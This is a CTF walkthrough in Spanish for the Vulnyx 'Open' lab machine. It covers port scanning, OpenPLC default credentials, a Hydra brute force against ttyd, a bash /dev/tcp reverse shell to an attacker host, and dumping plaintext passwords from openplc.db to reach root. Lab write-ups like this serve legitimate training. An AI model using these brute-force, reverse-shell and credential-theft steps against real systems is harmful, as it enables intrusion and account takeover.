---
icon: flag
---

# Open Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 04:46 EDT
Nmap scan report for 192.168.5.88
Host is up (0.0076s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp   open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
7681/tcp open  http    ttyd 1.7.7-40e79c7 (libwebsockets 4.3.3-unknown)
|_http-server-header: ttyd/1.7.7-40e79c7 (libwebsockets/4.3.3-unknown)
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=ttyd
8080/tcp open  http    Werkzeug httpd 2.3.7 (Python 3.11.2)
|_http-server-header: Werkzeug/2.3.7 Python/3.11.2
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
MAC Address: 08:00:27:75:AD:41 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds
```

Veremos varios puertos interesantes, pero entre ellos veremos el puerto `80` y el puerto `8080`, vamos a ver que alojan cada uno de ellos.

Si entramos en el puerto `80` veremos un `apache2` normal sin nada interesantes, pero si entramos al puerto `8080` veremos un `login` de un `software` llamado `openplc` vamos a buscar algun `exploit` asociado con el.

URL = [Exploit openplc](https://github.com/thewhiteh4t/cve-2021-31630)

Veremos que hay uno asociado, no sabemos si la version es la correcta, pero si vemos en el codigo fuente como funciona por dentro veremos que por defecto prueba las credenciales por defecto de dicho `software`.

```
User: openplc
Pass: openplc
```

## Escalate user tirex

Si las probamos directamente veremos que funcionan y estaremos dentro del panel de `administrador`, si ejecutamos el `exploit` no veremos que funcione, por lo que vamos a investigar un poco por el panel a ver que vemos.

Si nos vamos a `usuarios` veremos varios interesantes los cuales vamos a realizar una lista:

> users.txt

```
root
tirex
openplc
```

Pero por `SSH` no veremos nada interesante, por lo que vamos a probar en el `login` del puerto `7681`, si entramos dentro veremos que es un `login` de `http-get`, por lo que vamos a realizar lo siguiente:

### Hydra

```shell
hydra -L users.txt -P <WORDLIST> http-get://<IP>:7681 -F -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-23 10:20:43
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-get://192.168.5.88:7681/
[7681][http-get] host: 192.168.5.88   login: tirex   password: heaven
[STATUS] attack finished for 192.168.5.88 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-23 10:20:46
```

Veremos que hemos encontrados las credenciales del usuario `tirex`, si entramos dentro...

```
user: tirex
pass: heaven
```

Veremos que tenemos una `shell` en el servidor atraves de una web como el usuario `tirex`:

```
tirex@open:~$ whoami
tirex
```

Por lo que vamos a enviarnos una `reverse shell` para poder tener una mejor `shell`.

```shell
bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Antes de enviarlo nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo anterior y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.88] 49350
tirex@open:~$ whoami
whoami
tirex
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Echo esto vamos a leer la `flag` del usuario.

> user.txt

```
36537694f3321e7a7911d746f311ed1d
```

## Escalate Privileges

Acordemonos de que antes vimos a un usuario en la web llamado `root`, puede ser que la web contenga las credenciales del propio `root` tambien a nivel de sistema, por lo que si nos vamos a donde se almacena `OpenPLC` que es donde se almacenan las contraseñas:

```shell
cd /opt/OpenPLC_v3/webserver
```

Veremos lo siguiente:

```
total 10016
drwxr-xr-x 8 tirex tirex    4096 ago 23 10:52 .
drwxr-xr-x 8 tirex tirex    4096 ago 22 19:11 ..
-rwxr-xr-x 1 tirex tirex      17 ago 23 10:45 active_program
-rw-r--r-- 1 tirex tirex    4607 ago 22 19:09 check_openplc_db.py
drwxr-xr-x 5 tirex tirex    4096 ago 23 10:45 core
-rw-r--r-- 1 tirex tirex    2006 ago 22 19:09 dnp3.cfg
-rwxr-xr-x 1 tirex tirex 9837872 ago 22 19:10 iec2c
drwxr-xr-x 2 tirex tirex    4096 ago 22 19:09 lib
-rw-r--r-- 1 tirex tirex    6458 ago 22 19:09 monitoring.py
-rw-r--r-- 1 tirex tirex   53248 ago 23 10:52 openplc.db
-rw-r--r-- 1 tirex tirex    7696 ago 22 19:09 openplc.py
-rw-r--r-- 1 tirex tirex   99861 ago 22 19:09 pages.py
drwxr-xr-x 2 tirex tirex    4096 ago 22 19:13 __pycache__
drwxr-xr-x 2 tirex tirex    4096 ago 22 19:11 scripts
drwxr-xr-x 3 tirex tirex    4096 ago 22 19:09 static
drwxr-xr-x 2 tirex tirex    4096 ago 23 10:52 st_files
-rwxr-xr-x 1 tirex tirex   35720 ago 22 19:10 st_optimizer
-rw-r--r-- 1 tirex tirex  159532 ago 22 19:09 webserver.py
```

De todo esto lo que nos interesa es la llamada `openplc.db` vemos que esta como el usuario que tenemos ahora a nivel de permisos, por lo que podremos utilizar `sqlite3` para inspeccionar dicho `.db` de esta forma:

```sql
.tables
```

Info:

```
Programs   Settings   Slave_dev  Users
```

Vamos a volcar la informacion de `Users` a ver que vemos:

```sql
SELECT * FROM Users;
```

Info:

```
10|openplc|openplc|openplc@open.nyx|openplc|
11|tirex|tirex|tirex@open.nyx|Th3_r00t_is_G0d|
12|root|root|root@open.nyx|Th3_r00t_is_G0d|
```

Veremos que la contraseña de `root` en la pagina al igual que la de `tirex` es `Th3_r00t_is_G0d` por lo que vamos a probarla a nivel de sistema a ver si funciona.

```shell
su root
```

Metemos como contraseña `Th3_r00t_is_G0d`...

```
root@open:/opt/OpenPLC_v3/webserver# whoami
root
```

Veremos que con esto seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
bba5053c73653e33a5eefaefb4ad8e47
```
